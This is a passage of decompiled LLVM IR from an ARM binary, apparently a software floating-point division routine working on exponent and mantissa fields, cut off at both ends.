  %.pre148.pre-phi = phi i32 [ %.pre150, %entry..thread2_crit_edge ], [ %v5_1ad80, %bb92 ]
  br label %dec_label_pc_1af04

bb93:                                             ; preds = %bb92
  %v5_1ad88 = icmp eq i32 %v6_1ad80, 2047
  br i1 %v5_1ad88, label %dec_label_pc_1af04, label %dec_label_pc_1ad90

dec_label_pc_1ad90:                               ; preds = %bb93
  %v2_1ad90 = sub nsw i32 %v5_1ad7c, %v6_1ad80
  store i32 %v2_1ad90, i32* %r4.global-to-local, align 4
  %v2_1ad94 = xor i32 %v1_1ad7c, %arg3
  %v4_1ad98 = mul i32 %arg3, 4096
  %v5_1ad98 = or i32 %v4_1ad98, %arg4
  store i32 %v5_1ad98, i32* %r5.global-to-local, align 4
  %v7_1ad98 = icmp eq i32 %v5_1ad98, 0
  %v3_1ad9c = mul i32 %v1_1ad7c, 4096
  store i32 %v3_1ad9c, i32* %r0.global-to-local, align 4
  br i1 %v7_1ad98, label %dec_label_pc_1aed4, label %dec_label_pc_1ada4

dec_label_pc_1ada4:                               ; preds = %dec_label_pc_1ad90
  %tmp94 = mul i32 %arg3, 256
  %v4_1adac = and i32 %tmp94, 268435200
  %v4_1adb0 = udiv i32 %arg4, 16777216
  %v5_1adac = or i32 %v4_1adb0, %v4_1adac
  %v5_1adb0 = or i32 %v5_1adac, 268435456
  store i32 %v5_1adb0, i32* %r2.global-to-local, align 4
  %v3_1adb4 = mul i32 %arg4, 256
  store i32 %v3_1adb4, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_1ad7c, 256
  %v4_1adb8 = and i32 %tmp95, 268435200
  %v1_1adbc = load i32, i32* @r1, align 4
  %v4_1adbc = udiv i32 %v1_1adbc, 16777216
  %v5_1adb8 = or i32 %v4_1adb8, %v4_1adbc
  %v5_1adbc = or i32 %v5_1adb8, 268435456
  store i32 %v5_1adbc, i32* %r5.global-to-local, align 4
  %v3_1adc0 = mul i32 %v1_1adbc, 256
  store i32 %v3_1adc0, i32* %r6.global-to-local, align 4
  %v1_1adc4 = and i32 %v2_1ad94, -2147483648
  store i32 %v1_1adc4, i32* %r0.global-to-local, align 4
  %v3_1adc8 = icmp uge i32 %v5_1adbc, %v5_1adb0
  %v9_1adc8 = icmp eq i32 %v5_1adbc, %v5_1adb0
  br i1 %v9_1adc8, label %bb96, label %bb97

bb96:                                             ; preds = %dec_label_pc_1ada4
  %v4_1adcc = icmp uge i32 %v3_1adc0, %v3_1adb4
  br label %bb97

bb97:                                             ; preds = %dec_label_pc_1ada4, %bb96
  %v1_1add0 = phi i1 [ %v3_1adc8, %dec_label_pc_1ada4 ], [ %v4_1adcc, %bb96 ]
  %v2_1add0 = add nsw i32 %v2_1ad90, 253
  %v3_1add0 = zext i1 %v1_1add0 to i32
  %v4_1add0 = add nsw i32 %v2_1add0, %v3_1add0
  %v8_1add0 = icmp ule i32 %v4_1add0, %v2_1ad90
  %v9_1add0 = icmp ugt i32 %v2_1ad90, -254
  %v10_1add0 = select i1 %v1_1add0, i1 %v8_1add0, i1 %v9_1add0
  %v1_1add4 = add nsw i32 %v4_1add0, 768
  store i32 %v1_1add4, i32* %r4.global-to-local, align 4
  br i1 %v10_1add0, label %dec_label_pc_1ade4, label %dec_label_pc_1addc

dec_label_pc_1addc:                               ; preds = %bb97
  %v3_1addc = udiv i32 %v5_1adb0, 2
  store i32 %v3_1addc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ade4

dec_label_pc_1ade4:                               ; preds = %bb97, %dec_label_pc_1addc
  %v0_1adec = phi i32 [ %v5_1adb0, %bb97 ], [ %v3_1addc, %dec_label_pc_1addc ]
  %v0_1adf0 = phi i32 [ %v3_1adb4, %bb97 ], [ 0, %dec_label_pc_1addc ]
  %v2_1ade4 = sub i32 %v3_1adc0, %v0_1adf0
  store i32 %v2_1ade4, i32* %r6.global-to-local, align 4
  %v3_1ade4 = icmp uge i32 %v3_1adc0, %v0_1adf0
  %v3_1ade8 = icmp eq i1 %v3_1ade4, false
  %v4_1ade8 = sub nsw i32 %v5_1adbc, %v0_1adec
  %v6_1ade8 = sext i1 %v3_1ade8 to i32
  %v7_1ade8 = add nsw i32 %v6_1ade8, %v4_1ade8
  store i32 %v7_1ade8, i32* %r5.global-to-local, align 4
  %v3_1adec = udiv i32 %v0_1adec, 2
  store i32 %v3_1adec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1adfc.outer

dec_label_pc_1adfc.outer:                         ; preds = %dec_label_pc_1ae94, %dec_label_pc_1ade4
  %v1_1aea8.ph = phi i32 [ %v2_1ae94, %dec_label_pc_1ae94 ], [ %v1_1adc4, %dec_label_pc_1ade4 ]
  %v0_1ae00.ph = phi i32 [ %v5_1ae70, %dec_label_pc_1ae94 ], [ %v7_1ade8, %dec_label_pc_1ade4 ]
  %v1_1ae04.ph = phi i32 [ %v3_1ae74, %dec_label_pc_1ae94 ], [ %v2_1ade4, %dec_label_pc_1ade4 ]
  %v5_1ae7c17.ph = phi i32 [ %v5_1ae7c, %dec_label_pc_1ae94 ], [ %v3_1adec, %dec_label_pc_1ade4 ]
  %v3_1ae8013.ph = phi i32 [ %v3_1ae80, %dec_label_pc_1ae94 ], [ 0, %dec_label_pc_1ade4 ]
  %storemerge136 = phi i32 [ 0, %dec_label_pc_1ae94 ], [ 1048576, %dec_label_pc_1ade4 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1ae94 ], [ 524288, %dec_label_pc_1ade4 ]
  store i32 %storemerge136, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1adfc

dec_label_pc_1adfc:                               ; preds = %dec_label_pc_1adfc.outer, %dec_label_pc_1ae6c
  %v1_1ae6059 = phi i32 [ %v2_1aea8, %dec_label_pc_1ae6c ], [ %storemerge136, %dec_label_pc_1adfc.outer ]
  %v1_1ae0c = phi i32 [ %v1_1ae0c32, %dec_label_pc_1ae6c ], [ %storemerge136, %dec_label_pc_1adfc.outer ]
  %v1_1ae2841 = phi i32 [ %v1_1ae2843, %dec_label_pc_1ae6c ], [ %storemerge136, %dec_label_pc_1adfc.outer ]
  %v1_1ae4450 = phi i32 [ %v1_1ae4452, %dec_label_pc_1ae6c ], [ %storemerge136, %dec_label_pc_1adfc.outer ]
  %v0_1ae84 = phi i32 [ %v3_1ae84, %dec_label_pc_1ae6c ], [ %storemerge, %dec_label_pc_1adfc.outer ]
  %v0_1ae00 = phi i32 [ %v5_1ae70, %dec_label_pc_1ae6c ], [ %v0_1ae00.ph, %dec_label_pc_1adfc.outer ]
  %v1_1ae04 = phi i32 [ %v3_1ae74, %dec_label_pc_1ae6c ], [ %v1_1ae04.ph, %dec_label_pc_1adfc.outer ]
  %v5_1ae7c17 = phi i32 [ %v5_1ae7c, %dec_label_pc_1ae6c ], [ %v5_1ae7c17.ph, %dec_label_pc_1adfc.outer ]
  %v3_1ae8013 = phi i32 [ %v3_1ae80, %dec_label_pc_1ae6c ], [ %v3_1ae8013.ph, %dec_label_pc_1adfc.outer ]
  %v3_1adfc = icmp uge i32 %v1_1ae04, %v3_1ae8013
  %v3_1ae00 = icmp eq i1 %v3_1adfc, false
  %v4_1ae00 = sub i32 %v0_1ae00, %v5_1ae7c17
  %v6_1ae00 = sext i1 %v3_1ae00 to i32
  %v7_1ae00 = add i32 %v6_1ae00, %v4_1ae00
  %v8_1ae00 = zext i1 %v3_1ae00 to i32
  %v9_1ae00 = sub i32 %v7_1ae00, %v8_1ae00
  %v10_1ae00 = icmp ult i32 %v0_1ae00, %v9_1ae00
  %v11_1ae00 = icmp ne i32 %v5_1ae7c17, -1
  %v12_1ae00 = or i1 %v11_1ae00, %v10_1ae00
  %v13_1ae00 = icmp ult i32 %v0_1ae00, %v5_1ae7c17
  %v14_1ae00 = select i1 %v3_1ae00, i1 %v12_1ae00, i1 %v13_1ae00
  br i1 %v14_1ae00, label %.thread4, label %bb98

bb98:                                             ; preds = %dec_label_pc_1adfc
  %v3_1ae04 = sub i32 %v1_1ae04, %v3_1ae8013
  store i32 %v3_1ae04, i32* %r6.global-to-local, align 4
  store i32 %v7_1ae00, i32* %r5.global-to-local, align 4
  %v3_1ae0c = or i32 %v1_1ae0c, %v0_1ae84
  store i32 %v3_1ae0c, i32* %r1.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1adfc, %bb98
  %v1_1ae6058 = phi i32 [ %v1_1ae6059, %dec_label_pc_1adfc ], [ %v3_1ae0c, %bb98 ]
  %v1_1ae0c35 = phi i32 [ %v1_1ae0c, %dec_label_pc_1adfc ], [ %v3_1ae0c, %bb98 ]
  %v1_1ae28 = phi i32 [ %v1_1ae2841, %dec_label_pc_1adfc ], [ %v3_1ae0c, %bb98 ]
  %v1_1ae4449 = phi i32 [ %v1_1ae4450, %dec_label_pc_1adfc ], [ %v3_1ae0c, %bb98 ]
  %v0_1ae1c = phi i32 [ %v0_1ae00, %dec_label_pc_1adfc ], [ %v7_1ae00, %bb98 ]
  %v1_1ae20 = phi i32 [ %v1_1ae04, %dec_label_pc_1adfc ], [ %v3_1ae04, %bb98 ]
  %v1_1ae10 = urem i32 %v5_1ae7c17, 2
  %v2_1ae10 = icmp ne i32 %v1_1ae10, 0
  %v3_1ae10 = udiv i32 %v5_1ae7c17, 2
  %v3_1ae14 = zext i1 %v2_1ae10 to i32
  %v6_1ae14 = zext i32 %v3_1ae8013 to i64
  %v7_1ae14 = sub i32 33, %v3_1ae8013
  %v8_1ae14 = zext i32 %v7_1ae14 to i64
  %v9_1ae14 = shl i64 %v6_1ae14, %v8_1ae14
  %v10_1ae14 = sub i32 32, %v3_1ae8013
  %v11_1ae14 = shl i32 %v3_1ae14, %v10_1ae14
  %v12_1ae14 = zext i32 %v11_1ae14 to i64
  %v14_1ae14 = or i64 %v12_1ae14, %v9_1ae14
  %v15_1ae14 = trunc i64 %v14_1ae14 to i32
  %v3_1ae18 = icmp uge i32 %v1_1ae20, %v15_1ae14
  %v3_1ae1c = icmp eq i1 %v3_1ae18, false
  %v4_1ae1c = sub i32 %v0_1ae1c, %v3_1ae10
  %v6_1ae1c = sext i1 %v3_1ae1c to i32
  %v7_1ae1c = add i32 %v6_1ae1c, %v4_1ae1c
  %v13_1ae1c = icmp ult i32 %v0_1ae1c, %v3_1ae10
  %v14_1ae1c = or i1 %v13_1ae1c, %v3_1ae1c
  br i1 %v14_1ae1c, label %.thread6, label %bb99

bb99:                                             ; preds = %.thread4
  %v3_1ae20 = sub i32 %v1_1ae20, %v15_1ae14
  store i32 %v3_1ae20, i32* %r6.global-to-local, align 4
  store i32 %v7_1ae1c, i32* %r5.global-to-local, align 4
  %v5_1ae28 = udiv i32 %v0_1ae84, 2
  %v6_1ae28 = or i32 %v1_1ae28, %v5_1ae28
  store i32 %v6_1ae28, i32* %r1.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb99
  %v1_1ae6057 = phi i32 [ %v1_1ae6058, %.thread4 ], [ %v6_1ae28, %bb99 ]
  %v1_1ae0c34 = phi i32 [ %v1_1ae0c35, %.thread4 ], [ %v6_1ae28, %bb99 ]
  %v1_1ae2845 = phi i32 [ %v1_1ae28, %.thread4 ], [ %v6_1ae28, %bb99 ]
  %v1_1ae44 = phi i32 [ %v1_1ae4449, %.thread4 ], [ %v6_1ae28, %bb99 ]
  %v0_1ae38 = phi i32 [ %v0_1ae1c, %.thread4 ], [ %v7_1ae1c, %bb99 ]
  %v1_1ae3c = phi i32 [ %v1_1ae20, %.thread4 ], [ %v3_1ae20, %bb99 ]
  %v1_1ae2c = urem i32 %v3_1ae10, 2
  %v2_1ae2c = icmp ne i32 %v1_1ae2c, 0
  %v3_1ae2c = udiv i32 %v5_1ae7c17, 4
  %v3_1ae30 = zext i1 %v2_1ae2c to i32
  %v6_1ae30 = and i64 %v14_1ae14, 4294967295
  %v7_1ae30 = sub i32 33, %v15_1ae14
  %v8_1ae30 = zext i32 %v7_1ae30 to i64
  %v9_1ae30 = shl i64 %v6_1ae30, %v8_1ae30
  %v10_1ae30 = sub i32 32, %v15_1ae14
  %v11_1ae30 = shl i32 %v3_1ae30, %v10_1ae30
  %v12_1ae30 = zext i32 %v11_1ae30 to i64
  %v14_1ae30 = or i64 %v12_1ae30, %v9_1ae30
  %v15_1ae30 = trunc i64 %v14_1ae30 to i32
  %v3_1ae34 = icmp uge i32 %v1_1ae3c, %v15_1ae30
  %v3_1ae38 = icmp eq i1 %v3_1ae34, false
  %v4_1ae38 = sub i32 %v0_1ae38, %v3_1ae2c
  %v6_1ae38 = sext i1 %v3_1ae38 to i32
  %v7_1ae38 = add i32 %v6_1ae38, %v4_1ae38
  %v13_1ae38 = icmp ult i32 %v0_1ae38, %v3_1ae2c
  %v14_1ae38 = or i1 %v13_1ae38, %v3_1ae38
  br i1 %v14_1ae38, label %.thread8, label %bb100

bb100:                                            ; preds = %.thread6
  %v3_1ae3c = sub i32 %v1_1ae3c, %v15_1ae30
  store i32 %v3_1ae3c, i32* %r6.global-to-local, align 4
  store i32 %v7_1ae38, i32* %r5.global-to-local, align 4
  %v5_1ae44 = udiv i32 %v0_1ae84, 4
  %v6_1ae44 = or i32 %v1_1ae44, %v5_1ae44
  store i32 %v6_1ae44, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb100
  %v1_1ae60 = phi i32 [ %v1_1ae6057, %.thread6 ], [ %v6_1ae44, %bb100 ]
  %v1_1ae0c33 = phi i32 [ %v1_1ae0c34, %.thread6 ], [ %v6_1ae44, %bb100 ]
  %v1_1ae2844 = phi i32 [ %v1_1ae2845, %.thread6 ], [ %v6_1ae44, %bb100 ]
  %v1_1ae4453 = phi i32 [ %v1_1ae44, %.thread6 ], [ %v6_1ae44, %bb100 ]
  %v0_1ae54 = phi i32 [ %v0_1ae38, %.thread6 ], [ %v7_1ae38, %bb100 ]
  %v1_1ae58 = phi i32 [ %v1_1ae3c, %.thread6 ], [ %v3_1ae3c, %bb100 ]
  %v1_1ae48 = urem i32 %v3_1ae2c, 2
  %v2_1ae48 = icmp ne i32 %v1_1ae48, 0
  %v3_1ae48 = udiv i32 %v5_1ae7c17, 8
  %v3_1ae4c = zext i1 %v2_1ae48 to i32
  %v6_1ae4c = and i64 %v14_1ae30, 4294967295
  %v7_1ae4c = sub i32 33, %v15_1ae30
  %v8_1ae4c = zext i32 %v7_1ae4c to i64
  %v9_1ae4c = shl i64 %v6_1ae4c, %v8_1ae4c
  %v10_1ae4c = sub i32 32, %v15_1ae30
  %v11_1ae4c = shl i32 %v3_1ae4c, %v10_1ae4c
  %v12_1ae4c = zext i32 %v11_1ae4c to i64
  %v14_1ae4c = or i64 %v12_1ae4c, %v9_1ae4c
  %v15_1ae4c = trunc i64 %v14_1ae4c to i32
  %v3_1ae50 = icmp uge i32 %v1_1ae58, %v15_1ae4c
  %v3_1ae54 = icmp eq i1 %v3_1ae50, false
  %v4_1ae54 = sub i32 %v0_1ae54, %v3_1ae48
  %v6_1ae54 = sext i1 %v3_1ae54 to i32
  %v7_1ae54 = add i32 %v6_1ae54, %v4_1ae54
  %v13_1ae54 = icmp ult i32 %v0_1ae54, %v3_1ae48
  %v14_1ae54 = or i1 %v13_1ae54, %v3_1ae54
  br i1 %v14_1ae54, label %.thread10, label %bb102

bb102:                                            ; preds = %.thread8
  %v3_1ae58 = sub i32 %v1_1ae58, %v15_1ae4c
  store i32 %v3_1ae58, i32* %r6.global-to-local, align 4
  store i32 %v7_1ae54, i32* %r5.global-to-local, align 4
  %v5_1ae60 = udiv i32 %v0_1ae84, 8
  %v6_1ae60 = or i32 %v1_1ae60, %v5_1ae60
  store i32 %v6_1ae60, i32* %r1.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb102
  %v1_1ae70 = phi i32 [ %v1_1ae58, %.thread8 ], [ %v3_1ae58, %bb102 ]
  %v0_1ae6c = phi i32 [ %v0_1ae54, %.thread8 ], [ %v7_1ae54, %bb102 ]
  %v2_1aea8 = phi i32 [ %v1_1ae60, %.thread8 ], [ %v6_1ae60, %bb102 ]
  %v1_1ae0c32 = phi i32 [ %v1_1ae0c33, %.thread8 ], [ %v6_1ae60, %bb102 ]
  %v1_1ae2843 = phi i32 [ %v1_1ae2844, %.thread8 ], [ %v6_1ae60, %bb102 ]
  %v1_1ae4452 = phi i32 [ %v1_1ae4453, %.thread8 ], [ %v6_1ae60, %bb102 ]
  %v2_1ae64 = or i32 %v0_1ae6c, %v1_1ae70
  %v4_1ae64 = icmp eq i32 %v2_1ae64, 0
  br i1 %v4_1ae64, label %dec_label_pc_1aea4, label %dec_label_pc_1ae6c

dec_label_pc_1ae6c:                               ; preds = %.thread10
  %v3_1ae6c = mul i32 %v0_1ae6c, 16
  %v4_1ae70 = udiv i32 %v1_1ae70, 268435456
  %v5_1ae70 = or i32 %v3_1ae6c, %v4_1ae70
  store i32 %v5_1ae70, i32* %r5.global-to-local, align 4
  %v3_1ae74 = mul i32 %v1_1ae70, 16
  store i32 %v3_1ae74, i32* %r6.global-to-local, align 4
  %v3_1ae78 = mul nuw i32 %v3_1ae48, 8
  %v4_1ae7c = udiv i32 %v15_1ae4c, 536870912
  %v5_1ae7c = or i32 %v4_1ae7c, %v3_1ae78
  %v3_1ae80 = mul i32 %v15_1ae4c, 8
  %v3_1ae84 = udiv i32 %v0_1ae84, 16
  store i32 %v3_1ae84, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1ae84, 16
  br i1 %tmp, label %dec_label_pc_1ae8c, label %dec_label_pc_1adfc

dec_label_pc_1ae8c:                               ; preds = %dec_label_pc_1ae6c
  %v1_1ae8c = and i32 %v1_1aea8.ph, 1048576
  %v2_1ae8c = icmp eq i32 %v1_1ae8c, 0
  br i1 %v2_1ae8c, label %dec_label_pc_1ae94, label %.thread11.loopexit

dec_label_pc_1ae94:                               ; preds = %dec_label_pc_1ae8c
  %v2_1ae94 = or i32 %v2_1aea8, %v1_1aea8.ph
  store i32 %v2_1ae94, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1adfc.outer

dec_label_pc_1aea4:                               ; preds = %.thread10
  store i32 %v15_1ae4c, i32* %r3.global-to-local, align 4
  store i32 %v3_1ae48, i32* %r2.global-to-local, align 4
  %v1_1aea4 = and i32 %v1_1aea8.ph, 1048576
  %v2_1aea4 = icmp eq i32 %v1_1aea4, 0
  br i1 %v2_1aea4, label %bb103, label %.thread11

bb103:                                            ; preds = %dec_label_pc_1aea4
  %v3_1aea8 = or i32 %v2_1aea8, %v1_1aea8.ph
  store i32 %v3_1aea8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1ae8c
  store i32 %v3_1ae80, i32* %r3.global-to-local, align 4
  store i32 %v5_1ae7c, i32* %r2.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1aea4, %bb103
  %v1_1aeb0 = add nsw i32 %v4_1add0, 515
  store i32 %v1_1aeb0, i32* %ip.global-to-local, align 4
  %v2_1aeb0 = icmp ugt i32 %v1_1add4, 252
  %v7_1aeb0 = icmp eq i32 %v1_1add4, 253
  %v2_1aeb4 = xor i1 %v7_1aeb0, true
  %v3_1aeb4 = and i1 %v2_1aeb0, %v2_1aeb4
  br i1 %v3_1aeb4, label %bb104, label %bb105

bb104:                                            ; preds = %.thread11
  %v6_1aeb4 = icmp ugt i32 %v1_1aeb0, 1791
  %v11_1aeb4 = icmp eq i32 %v1_1aeb0, 1792
  br label %bb105

bb105:                                            ; preds = %.thread11, %bb104
  %v1_1aeb8 = phi i1 [ %v7_1aeb0, %.thread11 ], [ %v11_1aeb4, %bb104 ]
  %v0_1aeb8 = phi i1 [ %v2_1aeb0, %.thread11 ], [ %v6_1aeb4, %bb104 ]
  %v2_1aeb8 = xor i1 %v1_1aeb8, true
  %v3_1aeb8 = and i1 %v0_1aeb8, %v2_1aeb8
  call void @__pseudo_cond_branch(i1 %v3_1aeb8, i32 ptrtoint (i32* @global_var_1abe8.1400 to i32))
  %v0_1aebc = load i32, i32* %r5.global-to-local, align 4
  %v1_1aebc = load i32, i32* %r2.global-to-local, align 4
  %v2_1aebc = sub i32 %v0_1aebc, %v1_1aebc
  store i32 %v2_1aebc, i32* %ip.global-to-local, align 4
  %v3_1aebc = icmp uge i32 %v0_1aebc, %v1_1aebc
  %v9_1aebc = icmp eq i32 %v0_1aebc, %v1_1aebc
  br i1 %v9_1aebc, label %bb106, label %.thread12

bb106:                                            ; preds = %bb105
  %v1_1aec0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1aec0 = load i32, i32* %r3.global-to-local, align 4
  %v3_1aec0 = sub i32 %v1_1aec0, %v2_1aec0
  store i32 %v3_1aec0, i32* %ip.global-to-local, align 4
  %v4_1aec0 = icmp uge i32 %v1_1aec0, %v2_1aec0
  %v10_1aec0 = icmp eq i32 %v1_1aec0, %v2_1aec0
  br i1 %v10_1aec0, label %bb107, label %.thread12

bb107:                                            ; preds = %bb106
  %v1_1aec4 = load i32, i32* %r1.global-to-local, align 4
  %v2_1aec4 = urem i32 %v1_1aec4, 2
  %v3_1aec4 = icmp ne i32 %v2_1aec4, 0
  %v4_1aec4 = udiv i32 %v1_1aec4, 2
  store i32 %v4_1aec4, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb105, %bb106, %bb107
  %v1_1aec8 = phi i1 [ %v3_1aebc, %bb105 ], [ %v4_1aec0, %bb106 ], [ %v3_1aec4, %bb107 ]
  %v0_1aec8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1aec8 = zext i1 %v1_1aec8 to i32
  %v3_1aec8 = add i32 %v2_1aec8, %v0_1aec8
  store i32 %v3_1aec8, i32* %r1.global-to-local, align 4
  %v0_1aecc = load i32, i32* %r0.global-to-local, align 4
  %v1_1aecc = load i32, i32* %r4.global-to-local, align 4
  %v2_1aecc = and i32 %v1_1aecc, 4096
  %v3_1aecc = icmp ne i32 %v2_1aecc, 0
  %v4_1aecc = mul i32 %v1_1aecc, 1048576
  %v6_1aecc = add i32 %v4_1aecc, %v0_1aecc
  %v7_1aecc = zext i1 %v3_1aecc to i32
  %v8_1aecc = add i32 %v7_1aecc, %v6_1aecc
  store i32 %v8_1aecc, i32* %r0.global-to-local, align 4
  %v2_1aed0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1aed0, i32* %r4.global-to-local, align 4
  store i32 %v6_1ad70, i32* %r5.global-to-local, align 4
  store i32 %v9_1ad70, i32* %r6.global-to-local, align 4
  ret i32 %v8_1aecc

dec_label_pc_1aed4:                               ; preds = %dec_label_pc_1ad90
  %v1_1aed4 = and i32 %v2_1ad94, -2147483648
  %v4_1aed8 = urem i32 %v1_1ad7c, 1048576
  %v5_1aed8 = or i32 %v1_1aed4, %v4_1aed8
  store i32 %v5_1aed8, i32* %r0.global-to-local, align 4
  %v6_1aedc = add nsw i32 %v2_1ad90, 1023
  store i32 %v6_1aedc, i32* %r4.global-to-local, align 4
  %v8_1aedc = sub nsw i32 0, %v2_1ad90
  %v9_1aedc = and i32 %v6_1aedc, %v8_1aedc
  %v11_1aedc = icmp slt i32 %v2_1ad90, -1023
  %v12_1aedc = icmp eq i32 %v6_1aedc, 0
  %v7_1aee0 = icmp sgt i32 %v2_1ad90, -1023
  br i1 %v7_1aee0, label %bb108, label %bb109

bb108:                                            ; preds = %dec_label_pc_1aed4
  %v10_1aee0 = sub nsw i32 1024, %v2_1ad90
  store i32 %v10_1aee0, i32* %r5.global-to-local, align 4
  %v14_1aee0 = and i32 %v10_1aee0, %v6_1aedc
  %v16_1aee0 = icmp slt i32 %v10_1aee0, 0
  %v17_1aee0 = icmp eq i32 %v6_1aedc, 2047
  br label %bb109

bb109:                                            ; preds = %dec_label_pc_1aed4, %bb108
  %v2_1aee8.in = phi i32 [ %v9_1aedc, %dec_label_pc_1aed4 ], [ %v14_1aee0, %bb108 ]
  %v1_1aee8 = phi i1 [ %v11_1aedc, %dec_label_pc_1aed4 ], [ %v16_1aee0, %bb108 ]
  %v0_1aee8 = phi i1 [ %v12_1aedc, %dec_label_pc_1aed4 ], [ %v17_1aee0, %bb108 ]
  %v2_1aee8 = icmp slt i32 %v2_1aee8.in, 0
  %v3_1aee4 = xor i1 %v2_1aee8, %v1_1aee8
  %v4_1aee4 = or i1 %v0_1aee8, %v3_1aee4
  br i1 %v4_1aee4, label %bb111, label %bb110

bb110:                                            ; preds = %bb109
  %v9_1aee485 = mul i32 %v6_1aedc, 1048576
  %v10_1aee486 = or i32 %v9_1aee485, %v5_1aed8
  store i32 %v10_1aee486, i32* %r0.global-to-local, align 4
  store i32 %v3_1ad70, i32* %r4.global-to-local, align 4
  store i32 %v6_1ad70, i32* %r5.global-to-local, align 4
  ret i32 %v10_1aee486

bb111:                                            ; preds = %bb109
  %v1_1aeec = or i32 %v5_1aed8, 1048576
  store i32 %v1_1aeec, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v1_1aef4 = add nsw i32 %v2_1ad90, 1022
  store i32 %v1_1aef4, i32* @r4, align 4
  %v3_1aef4 = sub nsw i32 -1023, %v2_1ad90
  %v4_1aef4 = and i32 %v6_1aedc, %v3_1aef4
  %v5_1aef4 = icmp slt i32 %v4_1aef4, 0
  store i1 %v5_1aef4, i1* @cpsr_v, align 1
  %v6_1aef4 = icmp slt i32 %v2_1ad90, -1022
  store i1 %v6_1aef4, i1* @cpsr_n, align 1
  %v7_1aef4 = icmp eq i32 %v6_1aedc, 1
  store i1 %v7_1aef4, i1* @cpsr_z, align 1
  %v1_1aef8 = call i32 @function_1abe8(i32 %v1_1aeec)
  store i32 %v1_1aef8, i32* %r0.global-to-local, align 4
  %v0_1aefc = load i32, i32* @r5, align 4
  %v1_1aefc = load i32, i32* @r6, align 4
  %v2_1aefc = or i32 %v1_1aefc, %v0_1aefc
  store i32 %v2_1aefc, i32* @lr, align 4
  %v1_1af00 = call i32 @function_1abe8(i32 %v1_1aef8)
  store i32 %v1_1af00, i32* %r0.global-to-local, align 4
  %v0_1af04.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1af08.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1af04

dec_label_pc_1af04:                               ; preds = %.thread1, %.thread2, %bb93, %bb111
  %v4_1af04.pre-phi = phi i32 [ %v5_1ad80, %.thread1 ], [ %.pre148.pre-phi, %.thread2 ], [ %v5_1ad80, %bb93 ], [ %v5_1ad80, %bb111 ]
  %v0_1af08 = phi i32 [ %v5_1ad7c, %.thread1 ], [ %v5_1ad7c, %.thread2 ], [ %v5_1ad7c, %bb93 ], [ %v0_1af08.pre, %bb111 ]
  %v2_1af0c = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb93 ], [ %v0_1af04.pre, %bb111 ]
  %v5_1af04 = and i32 %v2_1af0c, %v4_1af04.pre-phi
  store i32 %v5_1af04, i32* @r5, align 4
  %v4_1af08 = icmp eq i32 %v2_1af0c, %v0_1af08
  br i1 %v4_1af08, label %bb112, label %bb113

bb112:                                            ; preds = %dec_label_pc_1af04
  %v5_1af0c = icmp eq i32 %v5_1af04, %v2_1af0c
  br label %bb113

bb113:                                            ; preds = %dec_label_pc_1af04, %bb112
  %v0_1af10 = phi i1 [ false, %dec_label_pc_1af04 ], [ %v5_1af0c, %bb112 ]
  call void @__pseudo_cond_branch(i1 %v0_1af10, i32 ptrtoint (i32* @global_var_1ad64.1401 to i32))
  %v0_1af14 = load i32, i32* @r4, align 4
  %v1_1af14 = load i32, i32* %ip.global-to-local, align 4
  %v4_1af14 = icmp eq i32 %v1_1af14, %v0_1af14
  br i1 %v4_1af14, label %dec_label_pc_1af1c, label %dec_label_pc_1af38

dec_label_pc_1af1c:                               ; preds = %bb113
  %v0_1af1c = load i32, i32* @r1, align 4
  %v1_1af1c = load i32, i32* %r0.global-to-local, align 4
  %v4_1af1c = mul i32 %v1_1af1c, 4096
  %v5_1af1c = or i32 %v4_1af1c, %v0_1af1c
  store i32 %v5_1af1c, i32* %r4.global-to-local, align 4
  %v1_1af20 = icmp ne i32 %v5_1af1c, 0
  call void @__pseudo_cond_branch(i1 %v1_1af20, i32 ptrtoint (i32* @global_var_1ad64.1401 to i32))
  %v0_1af24 = load i32, i32* @r5, align 4
  %v1_1af24 = load i32, i32* %ip.global-to-local, align 4
  %v1_1af28 = icmp ne i32 %v1_1af24, %v0_1af24
  call void @__pseudo_cond_branch(i1 %v1_1af28, i32 ptrtoint (i32* @global_var_1ad4c.1402 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1af34 = call i32 @function_1ad64(i32 %arg3, i32 %arg4)
  store i32 %v2_1af34, i32* %r0.global-to-local, align 4
  %v1_1af38.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1af38

dec_label_pc_1af38:                               ; preds = %bb113, %dec_label_pc_1af1c
  %v1_1af38 = phi i32 [ %v1_1af14, %bb113 ], [ %v1_1af38.pre, %dec_label_pc_1af1c ]
  %v0_1af38 = load i32, i32* @r5, align 4
  %v4_1af38 = icmp eq i32 %v0_1af38, %v1_1af38
  br i1 %v4_1af38, label %dec_label_pc_1af40, label %dec_label_pc_1af38.dec_label_pc_1af54_crit_edge

dec_label_pc_1af38.dec_label_pc_1af54_crit_edge:  ; preds = %dec_label_pc_1af38
  %v1_1af54.pre = load i32, i32* %r0.global-to-local, align 4
